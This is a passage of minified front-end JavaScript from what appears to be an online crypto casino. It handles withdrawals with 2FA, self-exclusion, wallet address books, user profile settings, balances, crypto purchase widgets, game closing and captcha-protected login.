                ]), 1 == stBal0 && (getCurs0(2), getCurs0(1)), 1 == stBalUsd && (getUSD(2), getUSD(1)), createNotifyL(2, e.data.message, lp.Success)) : 2 == e.data.error ? ask2FA() : createNotifyL(1, e.data.message, lp.Error)
            })).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }))
        } else stWidhCr555 = 0, t && (t.disabled = !1)
    },
    askSelfEx = () => {
        Swal.fire({
            title: "Select the period of self-exclusion",
            icon: "question",
            html: '\n            <style>\n            .swal2-html-container{\n              margin-left:8px;\n              margin-right:8px;\n            }\n            #swal2-title{\n              display: block;\n              font-size: 18px;\n              line-height: 20px;\n              font-weight: 300;\n              padding: 0 16px;\n            }\n            </style>\n           <div class="bmPOMR input ">\n           <div class="input-control select_wr999">\n           <select id=\'se342\'\'>\n           <option selected value="1">3 Days</option>\n           <option value="2">1 Week</option>\n           <option value="3">2 Week</option>\n           <option value="4">1 Month</option>\n           <option value="5">3 Month</option>\n           <option value="6">6 Month</option>\n           <option value="7">1 Year</option>\n           <option value="8">Forever</option>\n           </select></div></div>\n           ',
            showCancelButton: !1,
            confirmButtonColor: "#3085d6",
            confirmButtonText: lp.Send
        }).then((async e => {
            if (e.isConfirmed) {
                let e = new FormData;
                e.set("action", "userClickSelTimeExclusion"), e.set("dt", gD("se342").value), e.set("data", window.location.href.split("&data=")[1]);
                let t = await axios({
                    method: "post",
                    url: "/user/func.php",
                    data: e,
                    headers: {
                        "Content-Type": "multipart/form-data"
                    }
                }).catch((function(e) {
                    createNotifyL(1, e.message, lp.Error)
                }));
                0 == t.data.error ? createNotifyL(2, "", lp.Success) : createNotifyL(1, t.data.message, lp.Error)
            }
            closeHistory("&timeSelfExclusion")
        }))
    },
    ask2FA = () => {
        Swal.fire({
            title: lp["Submit your 2FA key for confirmation"],
            icon: "question",
            html: '\n            <style>\n            .swal2-html-container{\n              margin-left:8px;\n              margin-right:8px;\n            }\n            #swal2-title{\n              display: block;\n              font-size: 18px;\n              line-height: 20px;\n              font-weight: 300;\n              padding: 0 16px;\n            }\n            </style>\n           <div class="verification">\n            <input type="number" class="verification__input swal2-input verification__input--1" id="verification-input-1" placeholder="-" maxlength="1" />\n            <input type="number" class="verification__input swal2-input verification__input--2" id="verification-input-2" placeholder="-" maxlength="1" />\n            <input type="number" class="verification__input swal2-input verification__input--3" id="verification-input-3" placeholder="-" maxlength="1" />\n            <input type="number" class="verification__input swal2-input verification__input--4" id="verification-input-4" placeholder="-" maxlength="1" />\n            <input type="number" class="verification__input swal2-input verification__input--5" id="verification-input-5" placeholder="-" maxlength="1" />\n            <input type="text" class="verification__input swal2-input verification__input--6" id="verification-input-6" placeholder="-" maxlength="1" />\n           </div>',
            showCancelButton: !1,
            confirmButtonColor: "#3085d6",
            confirmButtonText: lp.Send
        }).then((e => {
            if (e.isConfirmed) {
                let e = document.getElementsByClassName("verification__input"),
                    t = "";
                Array.from(e).forEach((e => {
                    t += e.value
                })), 2 == stFCRbl ? sendWithdraw(t) : sendWithFiat(t)
            }
        }));
        class e {
            static inputs = [];
            static handleInput(e) {
                let t = e.nextElementSibling;
                t && e.value && (t.focus(), t.value && t.select())
            }
            static handleBackspace(e) {
                return e.value ? e.value = "" : e.previousElementSibling.focus()
            }
            static handleArrowLeft(e) {
                const t = e.previousElementSibling;
                return t ? t.focus() : void 0
            }
            static handleArrowRight(e) {
                const t = e.nextElementSibling;
                return t ? t.focus() : void 0
            }
            static handlePaste(e, t) {
                let s = (e.clipboardData || window.clipboardData).getData("text");
                t.forEach(((e, t) => {
                    e.value = s[t] || ""
                })), e.preventDefault()
            }
        }

        function t(e, t, s, a) {
            e.addEventListener("keydown", (a => a.key.toString().toLowerCase() == t && s(e)))
        }! function() {
            const s = document.querySelector(".verification"),
                a = document.querySelectorAll(".verification__input");
            a[0].focus(), s.addEventListener("input", (({
                target: t
            }) => e.handleInput(t))), s.addEventListener("paste", (t => e.handlePaste(t, a))), Array.from(a).forEach((s => {
                s.onfocus = () => s.select(), t(s, "backspace", e.handleBackspace), t(s, "arrowleft", e.handleArrowLeft), t(s, "arrowright", e.handleArrowRight)
            }))
        }()
    },
    saveAdressBook = () => {
        let e = -1,
            t = document.getElementById("addB_imageCur").getAttribute("alt"),
            s = "",
            a = document.getElementById("addB_adr").value,
            n = document.getElementById("addB_name").value,
            r = document.getElementsByClassName("dep_list_ns3")[0];
        if (r = r.getElementsByClassName("active")[0], r && chFDV7(r.dataset.cur, 1) == chFDV7(t, 1) && (s = chFDV7(r.innerHTML, 1)), 0 == a.length && (createNotifyL(1, lp["Enter wallet address"], lp.Error), e = 1), 0 == n.length && (createNotifyL(1, lp["Enter wallet name"], lp.Error), e = 1), -1 == e) {
            let e = new FormData;
            e.set("network", s), e.set("typepay", t), e.set("addr", a), e.set("title", n), e.set("action", "walletAddrAdd"), axios({
                method: "post",
                url: " /user/func.php",
                data: e,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).then((function(e) {
                0 == e.data.error ? (getAdrList(t, s, 3), document.getElementById("addB_adr").value = "", document.getElementById("addB_name").value = "") : createNotifyL(1, e.data.message, lp.Error)
            })).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }))
        }
    },
    opAdBook = e => {
        let t = document.getElementById("adBook_addT"),
            s = document.getElementById("adBook_listT"),
            a = document.getElementById("adBook_addB"),
            n = document.getElementById("adBook_listB");
        2 == e && (t.style.display = "none", s.style.display = "block", a.style.display = "none", n.style.display = "block"), 1 == e && (t.style.display = "block", s.style.display = "none", a.style.display = "block", n.style.display = "none")
    },
    crossCloseChat = () => {
        controlCont(2), closeChatGame(), document.getElementById("chat_control11").dataset.cont = "1"
    },
    stlM = 2,
    strM = 1,
    controlCont = e => {
        if (window.innerWidth > 1024) {
            let t = document.documentElement;
            if (1 == e) {
                strM = 2, t.style.setProperty("--mR", "360px");
                let e = 6;
                window.innerWidth > 1450 && (e = 7), window.innerWidth > 1850 && (e = 9), t.style.setProperty("--gridi", e), document.getElementsByClassName("support_desctop_i")[0].style = "display:none!important"
            }
            if (2 == e) {
                strM = 1, t.style.setProperty("--mR", "0px");
                let e = 8;
                window.innerWidth > 1450 && (e = 9), t.style.setProperty("--gridi", e), document.getElementsByClassName("support_desctop_i")[0].style = ""
            }
            3 == e && (stlM = 2, t.style.setProperty("--mL", "240px")), 4 == e && (stlM = 1, t.style.setProperty("--mL", "76px")), statusMainPage && changeHomePage()
        }
    };

function closeGame(e = 3) {
    if (1 == sportNewST) {
        try {
            btNewSport && btNewSport.kill()
        } catch (e) {}
        sportTG(1), sportNewST = 0;
        let e = document.getElementsByClassName("game_wrapper")[0];
        e.classList.remove("sport_wrapper"), e = document.getElementsByClassName("textDropCoins673888")[0], e = e.getElementsByTagName("a"), Array.from(e).forEach((e => {
            e.classList.remove("active")
        }))
    }
    document.getElementsByClassName("jetgames_wr")[0].classList.remove("openGame");
    let t = document.getElementsByClassName("game_wrapper")[0];
    if (t && (t.style.display = "none"), document.getElementById("home").classList.add("back117"), 3 == e) {
        document.getElementsByClassName("fast2_game_bl")[0].classList.remove("open"), closeHistory("?game=" + gameName, 2)
    }
    try {
        "esport" != pageNameM && "sport" != pageNameM && "liveSp" != pageNameM && axios({
            method: "post",
            url: pathFunc,
            data: `action=get_amount&game=${gameName}&gameSid=${gameSid}`,
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            }
        }).then((e => {
            0 == e.data.error && window.upMoneyCoins([
                [userBetCur, e.data.amount]
            ])
        }))
    } catch (e) {}
    let s = document.getElementsByTagName("link");
    if (Array.from(s).forEach((e => {
            let t = e.getAttribute("href");
            t && t.includes("/game/game/assets/ind.min.css?x=") && e.parentNode.removeChild(e)
        })), setGameAct(!1, "fast_gm765", 1), window.audioBack && (window.audioBack.muted = !0, window.audioBack.mute && window.audioBack.mute(!0), window.audioBack = null), window.indBetAuto && clearInterval(window.indBetAuto), window.indBetAuto1 && clearInterval(window.indBetAuto1), window.addEventListener("focus", (function(e) {
            e.stopImmediatePropagation()
        }), !0), "undefined" != typeof audioListGame) {
        for (const e in audioListGame) audioListGame[e].mute(!0);
        audioListGame = null
    }
    window.intervalPL && clearInterval(window.intervalPL), window.reqFrJet && window.cancelAnimationFrame(window.reqFrJet), window.reqFrJetT && window.cancelAnimationFrame(window.reqFrJetT), "undefined" != typeof socketJetGame && null != socketJetGame && socketJetGame.disconnect(), "undefined" != typeof socketJetGame && (socketJetGame = null), "undefined" != typeof startJetGame && (startJetGame = null), "undefined" != typeof coreJetGame && (coreJetGame = null), s = document.getElementsByTagName("script"), Array.from(s).forEach((e => {
        let t = e.getAttribute("src");
        t && (t.includes("/game/game/assets/socket.io.min.js?x") && e.parentNode.removeChild(e), t.includes("/game/game/gameCore.min.js") && e.parentNode.removeChild(e), t.includes("/game/game/assets/main.min.js?x=") && e.parentNode.removeChild(e))
    })), arrFuncsDol = [], 3 != e && setTimeout((() => {
        openGameNew(e)
    }), 200)
}
let dateReg77, user_creds, usssrIId, objUserInfo, hideNick, currencyLast, nickUser, networkLast, JETblock, phoneVerif, userEmail, activateEmail, userAvatarI, userAvatarUrl, userSiteNick, openMobileLogin = async e => {
    let t;
    if (window.innerWidth < 768 ? (t = document.getElementById("mobile-block-module"), t.style.height = "100%", t.style.display = "block") : (t = document.getElementsByClassName("registr-content21")[0], t.style.display = "flex", countR = 0), 22 != e && openHistory("?" + window.location.href.split("?")[1] + "&signin", 1), errFixCoins(), !document.getElementById("module-login3")) {
        t.innerHTML = "";
        let e = await axios.get("/modals/login.php").catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
        t.innerHTML = e.data
    }
    gC("lng_wr_no")[0].style.display = "none", t.style.zIndex = "16000", createTelegScr(2), 1 == e && open2faLog(), 22 == e && (gC("lng_wr_no")[0].style.display = "block", gC("log_wr_n")[0].style.display = "none", "" == gC("lng_wr_nnn")[0].innerHTML && (gC("lng_wr_nnn")[0].innerHTML = gC("lngs_234")[0].innerHTML))
}, closeMobileLogin = () => {
    let e;
    e = window.innerWidth < 768 || -1 != window.location.href.indexOf("?signup") ? document.getElementById("mobile-block-module") : document.getElementsByClassName("registr-content21")[0];
    let t = document.getElementById("mobile-login-wrapper");
    t.style.display = "block", t = document.getElementById("mobile-password-wrapper"), t.style.display = "block", t = document.getElementsByClassName("2fa_login21")[0], t.style.display = "none", closeHistory("&sign2FA"), closeHistory("&signin"), e.style.display = "none", e.style.height = "", e.style.zIndex = "", gC("lng_wr_no")[0].style.display = "none", gC("log_wr_n")[0].style.display = "block", errUnFixCoins()
}, getRakeback = (e = !1) => {
    let t = gD("rbtn912"),
        s = gD("rake_btn1");
    t && (t.disabled = !0), s && (s.disabled = !0);
    let a = new FormData;
    a.set("action", "userClickGetRakeback"), axios({
        method: "post",
        url: "/user/func.php",
        data: a,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((a => {
        0 == a.data.error ? (Swal.fire({
            title: lp["Success action"],
            text: a.data.message,
            icon: "success"
        }), e || closeRakeback(), e || openRakeback(), "Bonuses" == pageNameM && getAllBupdateCal(2)) : (Swal.fire({
            title: lp.Error,
            text: a.data.message,
            icon: "error"
        }), t && (t.disabled = !1), s && (s.disabled = !1))
    })).catch((function(e) {
        t && (t.disabled = !1), s && (s.disabled = !1), createNotifyL(1, e.message, lp.Error)
    }))
}, hPMf8 = e => {
    e.parentNode.outerHTML = ""
}, mobileSlidersN = (e, t) => {
    if (window.innerWidth < 1025) {
        let s = (e = document.getElementsByClassName(e)[0]).getElementsByClassName("mRsOE")[0];
        if (s && (s = s.offsetWidth + 14), 0 == t) return void(e.scrollLeft = (Math.floor(e.scrollLeft / s) - 1) * s);
        if (1 == t) return void(e.scrollLeft = (Math.floor(e.scrollLeft / s) + 1) * s)
    }
}, saveUserInfo = () => {
    let e = chFDV7(document.getElementById("countryUser").dataset.a, 2),
        t = new FormData;
    t.set("action", "saveUserInfo"), t.set("city", document.getElementById("cityUser").value), t.set("address", document.getElementById("addressUser").value), t.set("postcode", document.getElementById("postalUser").value), t.set("country", e), t.set("nick", document.getElementById("nicknameUser").value), t.set("fname", document.getElementById("first_nameUser").value), t.set("lname", document.getElementById("last_nameUser").value), t.set("birthday", document.getElementById("dateUser").value), userEmail = document.getElementById("emailUser").value, axios({
        method: "post",
        url: "/user/func.php",
        data: t,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((t => {
        0 == t.data.error ? (createNotifyL(2, "", lp.Success), "" != document.getElementById("nicknameUser").value && (document.getElementById("nicknameUser").disabled = !0), "" != document.getElementById("first_nameUser").value && (document.getElementById("first_nameUser").disabled = !0), "" != document.getElementById("last_nameUser").value && (document.getElementById("last_nameUser").disabled = !0), "" != document.getElementById("cityUser").value && (document.getElementById("cityUser").disabled = !0), "" != document.getElementById("addressUser").value && (document.getElementById("addressUser").disabled = !0), "" != document.getElementById("postalUser").value && (document.getElementById("postalUser").disabled = !0), "" != e && changeCoutry(!1, e), "" != document.getElementById("dateUser").value && (document.getElementById("dateUser").disabled = !0)) : createNotifyL(1, t.data.message, lp.Error)
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}, saveUserInfo2 = () => {
    let e = new FormData;
    e.set("action", "saveUserInfo2"), e.set("email", document.getElementById("emailUser").value), e.set("telegram", document.getElementById("name_tel15").value), e.set("steam", document.getElementById("name_tel17").value), e.set("vk", document.getElementById("name_tel18").value), e.set("twitch", document.getElementById("name_tel16").value), e.set("phonecode", document.getElementById("phonecode23").value), e.set("phone", document.getElementById("name_tel10").value), userEmail = document.getElementById("emailUser").value, axios({
        method: "post",
        url: "/user/func.php",
        data: e,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((e => {
        if (0 == e.data.error) {
            if (createNotifyL(2, "", lp.Success), activateEmail = e.data.activate, "0" == activateEmail) {
                document.getElementsByClassName("email_ver17")[0].style.display = "block"
            }
        } else createNotifyL(1, e.data.message, lp.Error)
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}, sendEmailVerif = () => {
    let e = new FormData;
    e.set("action", "sendVerifyEmail"), axios({
        method: "post",
        url: "/user/func.php",
        data: e,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((e => {
        0 == e.data.error ? Swal.fire({
            title: lp["Success action"],
            text: e.data.message,
            icon: "success"
        }) : Swal.fire({
            title: lp.Error,
            text: e.data.message,
            icon: "error"
        })
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}, asyFunc = async (e, t, s, a) => {
    a ? await e(a) : await e(), t(s)
}, arrayCurrency = [], timeAvatars = Date.now(), arrayCurrencyR = [], arrayCurrencyFiat = [], userLevel = 0, userLevelProc = 0, userCDep = 0, sendMailPromo = 0, setUserInfo = async () => {
    await modalOpenNew("modal_settings", "settings", 1);
    let e = new FormData;
    e.set("action", "userInfo");
    let t = await axios({
        method: "post",
        url: "/user/func.php",
        data: e,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }));
    if (0 == t.data.error) {
        let e = t.data;
        objUserInfo = e, hideNick = e.hideNick;
        let s = document.getElementById("emailUser");
        s.value = e.email, 1 == e.activate && (s.disabled = !0), activateEmail = e.activate, phoneVerif = e.phoneVerif, s = document.getElementById("nicknameUser"), s.value = e.nick, nickUser = e.nick, e.date_reg && (dateReg77 = getTimeDots(e.date_reg).substring(0, getTimeDots(e.date_reg).indexOf(" "))), window.intercomSettings = {
            api_base: "https://api-iam.intercom.io",
            app_id: "hhhxqrtn",
            name: e.nick,
            email: null,
            user_id: e.uid,
            deposit_count: e.depositCount
        }, usssrIId = e.uid, Intercom && Intercom("update"), "" == e.nick && (e.nick = e.email), userEmail = e.email, s = document.getElementsByClassName("profile__name")[0], s.innerHTML = e.nick, Array.from(gC("name_user_in")).forEach((t => t.innerHTML = e.nick)), s = document.getElementsByClassName("user-name"), Array.from(s).forEach((t => {
            t.innerHTML = e.nick
        })), 1 == e.vip && (s = document.getElementsByClassName("vip_cls"), Array.from(s).forEach((e => {
            e.style.display = "initial"
        }))), userSiteNick = e.nick, window.userPublickToken = e.userPublickToken, s = document.getElementById("first_nameUser"), s && (s.value = e.fname), "" != e.fname && (s.disabled = !0), s = document.getElementById("cityUser"), "" != e.city && null != e.city && (s.value = e.city), "" != e.city && null != e.city && (s.disabled = !0), s = document.getElementById("addressUser"), "" != e.address && null != e.address && (s.value = e.address), "" != e.address && null != e.address && (s.disabled = !0), s = document.getElementById("postalUser"), "" != e.postcode && null != e.postcode && (s.value = e.postcode), "" != e.postcode && null != e.postcode && (s.disabled = !0), "" != e.country && null != e.country && changeCoutry(!1, e.country), s = document.getElementById("last_nameUser"), s && (s.value = e.lname), "" != e.lname && (s.disabled = !0), s = document.getElementById("name_tel15"), s.value = e.telegram, s = document.getElementById("phonecode23"), "" != e.phonecode && (s.value = e.phonecode), s = document.getElementById("name_tel10"), "" != e.phone && (s.value = e.phone), s = document.getElementById("name_tel18"), "" != e.vk && (s.value = e.vk), s = document.getElementById("name_tel17"), "" != e.steam && (s.value = e.steam), s = document.getElementById("name_tel16"), "" != e.twitch && (s.value = e.twitch), s = document.getElementById("dateUser"), "" != e.birthday && (s.disabled = !0), "" != e.birthday && s.setAttribute("value", e.birthday), 1 == e.needverif && (document.getElementById("btn_verif").style.display = "block"), userAvatarUrl = e.avatarUrl, userAvatarI = e.avatarId, userAvatarUrl = 0 == userAvatarI && userAvatarUrl ? `/user_thumb/a_${userAvatarUrl}.jpg?x=` + timeAvatars : "/assets/chat/img/avatar" + userAvatarI + ".svg", userCDep = e.depositCount, sendMailPromo = e.sendMailPromo, lngGame = e.lng, status2FA = e["2fa"], 0 == Number(userCDep) && openFirstBon(e.date_reg, e.stime), changeLanguage(e.lng), countMesP = Number(e.mess_p), countMesS = Number(e.mess_s), getNotifyMes(), changeCountNot(3), changeCountNot(4), countMesNot = Number(e.mess_s) + Number(e.mess_p), changeCountNot(2)
    }
    if (e = new FormData, e.set("action", "userMoney"), t = await axios({
            method: "post",
            url: "/user/func.php",
            data: e,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        })), 0 == t.data.error) {
        let e = t.data;
        setUserLvl(e), userLevel = e.userLevel, delete e.userLevel, delete e.userLevelProc, e.user_creds && (user_creds = JSON.parse(e.user_creds)), delete e.user_creds;
        let s = e.current;
        userBetCur = s, JETblock = e.JETblock, delete e.error, delete e.current, delete e.JETblock, arrayCurrency = Object.entries(e);
        let a = ["NZD", "AUD", "USD", "CNY", "RUB", "PEN", "UZS", "GEL", "CLP", "UAH", "JET", "CANDY", "BRL", "KZT", "BDT", "KES", "AZN", "NGN", "CAD", "EUR", "TRY", "IDR", "INR", "PHP", "THB", "JPY", "VND", "MYR"];
        arrayCurrencyFiat = Array.from(a).filter((e => "JET" != e && "CANDY" != e)), arrayCurrencyFiatReal = arrayCurrencyFiat, 1 != userIDGame && 11 != userIDGame && 8303 != userIDGame || (arrayCurrencyFiatReal = arrayCurrencyFiatReal.filter((e => "USD" != e)));
        let n = arrayCurrency.filter((e => -1 == arrayCurrencyFiat.findIndex((t => t == e[0]))));
        if (arrayCurrencyFiat = arrayCurrency.filter((e => -1 != arrayCurrencyFiat.findIndex((t => t == e[0])))), arrayCurrencyFiatReal = arrayCurrencyFiat.filter((e => -1 != arrayCurrencyFiatReal.findIndex((t => t == e[0])))), arrayCurrency = n, arrayCurrencyR = arrayCurrency.filter((e => -1 == a.findIndex((t => t == e[0])))), -1 != arrayCurrency.findIndex((e => e[0] == userBetCur))) {
            fillBalHead(arrayCurrency);
            let e = document.getElementsByClassName("balance_cur_" + s)[0];
            chaBal({
                currentTarget: e
            }, 5)
        } else {
            let e = document.getElementsByClassName("currencyBal11")[0],
                t = e.getElementsByClassName("currency__coin")[0];
            t.setAttribute("src", `/assets/coins/${userBetCur}.svg`), t = e.getElementsByClassName("font-digits")[0];
            let s = "";
            1 == stBalUsd && (s = "$"), t.innerHTML = window.truncatorCoins(arrayCurrencyFiat.find((e => e[0] == userBetCur))[1], 8) + " " + s;
            let a = document.getElementsByClassName("balance_tg_wr")[0];
            a = a.getElementsByClassName("t_m_c113")[1], curCCH(1, a)
        }
        let r = localStorage.getItem("modeUsd");
        "null" != r && "1" === r && (changeToggle(document.getElementById("showUsdDoll1"), "usd"), changeToggle(document.getElementById("showUsdDoll2"), "")), r = localStorage.getItem("modeNul"), "null" != r && "1" === r && changeToggle(document.getElementById("showCursDoll1"), "000")
    }
    e = new FormData, e.set("action", "entry");
    let s = await axios({
        method: "post",
        url: "/user/func.php",
        data: e,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }));
    if (s = s.data, 0 == s.error) {
        lngGame = s.lngGame, userAvatarI = s.userAvatarId, userIDGame = s.userIDGame, userHASHGame = s.userHASHGame, createScriptChat();
        try {
            window.hj("identify", userIDGame, {
                x: userIDGame
            })
        } catch (e) {}
    }
    setAvatarUser()
}, getVerif = async () => {
    let e = new FormData;
    e.set("action", "getDataForVerif");
    let t = await axios({
        method: "post",
        url: "/user/func.php",
        data: e,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }));
    if (t = t.data, 0 == t.error) return closeSettings(), await openVeriff(), launchWebSdk(t.accessToken, t.applicantEmail), t.accessToken;
    createNotifyL(1, t.message, lp.Error)
}, setAvatarUser = () => {
    let e = document.getElementsByClassName("user_avatar117");
    Array.from(e).forEach((e => {
        e.setAttribute("src", userAvatarUrl + "?x=5")
    }));
    let t = document.getElementsByClassName("avatars_content_inner")[0];
    t && (t = t.getElementsByClassName("avatar" + userAvatarI)[0]), t && t.classList.add("active")
}, cryptoBuy = async e => {
    let t = new FormData,
        s = "",
        a = document.getElementsByClassName("dep_trigger30")[0];
    if (a = a.getElementsByTagName("img")[0].getAttribute("alt"), "" != a) {
        if ("USDT" == a) {
            let e = document.getElementsByClassName("dep_list_ns30")[0];
            e = e.getElementsByClassName("active")[0], s = e ? e.innerHTML : "TRC20"
        }
        if (t.set("network", s), t.set("typepay", a), 1 == e) {
            let e = await axios({
                method: "post",
                url: "/deposit/ccp/index.php",
                data: t,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }));
            if (0 != e.data.error) return void createNotifyL(1, e.data.mess, lp.Error);
            document.getElementById("buy_434").value = e.data.addr
        }
        axios({
            method: "post",
            url: 1 == e ? "/deposit/ramper/index.php" : "/deposit/ccp/index.php",
            data: t,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).then((async function(t) {
            if (0 == t.data.error) {
                document.getElementsByClassName("d_l_w30")[0].style.display = "none";
                let s = document.getElementById("changeCryptoBuy11");
                if (s && (s.outerHTML = ""), s = document.getElementById("changeCryptoBuy12"), s && (s.outerHTML = ""), s = document.getElementsByClassName("buy_d3222")[0], s.style.display = "block", s = document.getElementById("buy_111"), s.innerHTML = a, s = document.getElementById("buy_333"), s.innerHTML = a, s = document.getElementById("buy_434"), s.value = t.data.addr, 1 == e) {
                    let e = document.getElementById("buy__ramp");
                    e.style.display = "none", e.outerHTML += `\n          <iframe id='changeCryptoBuy12' width="100%" height="100%" frameborder='none' src="${t.data.url}">Can't load widget</iframe>\n          `
                }
                if (2 == e) {
                    let e = document.getElementById("buy__chang");
                    e.style.display = "none";
                    let s = a.toLowerCase();
                    e.outerHTML += `\n          <iframe id='changeCryptoBuy11' width="100%" height="100%" frameborder='none' src="https://widget.changelly.com?from=*&to=${s}&amount=50&address=${t.data.addr}&fromDefault=usd&toDefault=${s}&theme=default&merchant_id=gpvgmj46bu4v9z4y&payment_id=&v=3">Can't load widget</iframe>\n          `
                }
            }
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    } else createNotifyL(1, lp["Please select the main cryptocurrency you need"], lp.Error)
}, rampDisCurs = ["XRP", "ADA", "TRX"], openHowBuyC = (e, t) => {
    let s = userBetCur;
    1 == t && -1 == arrayCurrencyR.filter((e => "XRP" != e[0])).findIndex((e => e[0] == userBetCur)) && (s = "BTC");
    let a = document.getElementsByClassName("buy_cripto_bl1");
    Array.from(a).forEach((e => e.style.display = "none")), a = document.getElementById("buy__" + e), a.style.display = "block";
    let n = document.getElementById("buy__cross");
    if (n.style.display = 1 == t ? "block" : "none", n = document.getElementsByClassName("d_l_w30")[0], n.style.display = 1 == t ? "grid" : "none", openDropCur(document.getElementsByClassName("dep_trigger30")[0], 30, 1), cabChooseCur(s, 30), 1 == t) {
        let e = document.getElementsByClassName("b_cr_n");
        Array.from(e).forEach((e => e.innerHTML = s))
    } else {
        let e = document.getElementById("changeCryptoBuy11");
        e && (e.outerHTML = ""), e = document.getElementById("changeCryptoBuy12"), e && (e.outerHTML = ""), e = document.getElementsByClassName("buy_d3222")[0], e.style.display = "none"
    }
}, setUserLvl = e => {
    e.userLevelProc > 100 && (e.userLevelProc = 100), userLevelProc = e.userLevelProc;
    let t = document.getElementById("u_b_r_" + e.userLevel);
    t && t.setAttribute("src", "/assets/image/vipclub/rank-active.png"), Array.from(gC("lvl_user0")).forEach((t => t.innerHTML = lp.Level + " " + e.userLevel)), document.getElementsByClassName("user__level")[0].innerHTML = e.userLevel, Array.from(gC("lvl_user1")).forEach((t => t.innerHTML = lp.Level + " " + Number(Number(e.userLevel) + 1)));
    let s = (3 + 97 * e.userLevelProc / 100).toFixed(2);
    Array.from(gC("lvl_userS0")).forEach((e => e.style.width = s + "%")), document.getElementById("user_proclvl1").innerHTML = e.userLevelProc + "%", Array.from(gC("lvl_userS1")).forEach((t => t.innerHTML = e.userLevelProc + "%"))
}, labe22 = (e, t) => {
    Array.from(gC(t)).forEach((e => e.classList.remove("active"))), Array.from(gC(e)).forEach((e => e.classList.add("active")))
}, createHistoryMain = (e, t, s, a, n, r, o, i) => {
    let l = document.getElementsByClassName(e)[0];
    r = Number(r).toFixed(2);
    let c = new Date(t),
        d = `${c.getHours()<10?"0"+c.getHours():c.getHours()}:${c.getMinutes()<10?"0"+c.getMinutes():c.getMinutes()}:${c.getSeconds()<10?"0"+c.getSeconds():c.getSeconds()}`,
        u = o <= 0 ? "lose" : "win";
    o < 0 && (o = window.truncatorJet(0, 8)), 0 == s && (s = "Hidden"), "hi_lo" == i && (i = "hilo");
    let p = "",
        m = "2" == i.split("|")[0] || "1" == i.split("|")[0];
    "1" == i.split("|")[0] && (p = "Slots"), "2" == i.split("|")[0] && (p = "Dealers"), m && (i = i.split("|")[1]), i = i.charAt(0).toUpperCase() + i.slice(1), m || (p = i);
    let f = document.createElement("tr");
    f.innerHTML = `\n    <tr>\n        <td class="game-name"><img src="/assets/svgGame/${p}.svg" class="game-icon" alt="g">\n            <div class="name">${i}</div>\n        </td>\n        <td><div class="iTDswZ user-info">\n                <div class="name">\n                  <span class="hidden-name">\n                  ${s}\n                  </span>\n                </div>\n            </div></td>\n        <td>${d}</td>\n        <td>\n            <div class="jRfDrg coin notranslate has-sign">\n                <img class="coin-icon" alt="cur" src="/assets/coins/${n}.svg">\n                <div class="amount"><span style="color: #99a4b0;" class="amount-str">${a}</span></div>\n            </div>\n        </td>\n        <td>${r}x</td>\n        <td class="${u}">\n            <div class="jRfDrg coin notranslate has-sign"><img class="coin-icon" alt="cur" src="/assets/coins/${n}.svg">\n                <div class="amount"><span class="amount-str">${o}</span></div>\n            </div>\n        </td>\n    </tr>\n    `, l.innerHTML = f.outerHTML + l.innerHTML
}, openMoreMenu = e => {
    e.classList.contains("active") ? (e.nextSibling.nextSibling.classList.remove("active"), e.classList.remove("active")) : (e.classList.add("active"), e.nextSibling.nextSibling.classList.add("active"))
}, fillBalHead = e => {
    let t = document.getElementsByClassName("balance_list_wr")[0];
    t.innerHTML = "", e.forEach((e => {
        let s = "",
            a = () => window.truncatorCoins(Number(e[1]), 8);
        1 == stBalUsd && (s = "$", a = () => window.truncatorCoins(Number(e[1]), 8));
        let n = "JET" != e[0] ? "" : `<span class="b_j_block">${window.truncatorJet(JETblock,betListCur[e[0]].precision)} &#128274;</span>`,
            r = "JET" != e[0] && "CANDY" != e[0] ? "" : '<svg xmlns:xlink="http://www.w3.org/1999/xlink" class="dKApst icon open-icon "><use xlink:href="#icon_Inform"></use></svg>',
            o = "JET" != e[0] && "CANDY" != e[0] ? "" : 'onclick="openBonus(event,this)"',
            i = e[0] == userBetCur ? "user-money05" : "";
        t.innerHTML += `<li onclick="chaBal(event)" data-cur="${e[0]}" class="balance_cur_${e[0]}" data-v-4cd2ab42="" tabindex="2">\n        <div data-v-00005b7b="" data-v-4cd2ab42="" class="currency"><img loading="lazy" data-v-00005b7b="" height="22px" width="22px" src="/assets/coins/${e[0]}.svg" alt="${e[0]}" class="currency__coin" style="margin-right: 7.5px;">\n            <span data-v-00005b7b="" style="font-size: 15px;"><span style="color: #fff" class="font-digits ${i} b_l_c111 b117_${e[0]}">${a()} ${s}</span>\n            ${n}</span>\n        </div><span ${o} data-v-4cd2ab42="" class='currency_name_bal'>${r}${e[0]}</span>\n      </li>`
    }))
};

function login(e) {
    widgetIDL = hcaptcha.render("hcaptcha2", {
        sitekey: "04e6d4b5-6775-4735-b3ef-4f5c15175701",
        size: "invisible"
    }), hcaptcha.execute(widgetIDL, {
        async: !0
    }).then((({
        response: t,
        key: s
    }) => {
        e && (e.disabled = !0), loginl(t)
    }))
}
let disBlockEv = e => {
        e.preventDefault(), e.stopPropagation()
    },
    openProvSl = (e, t = "provs_bl1", s) => {
        let a = gD(t);
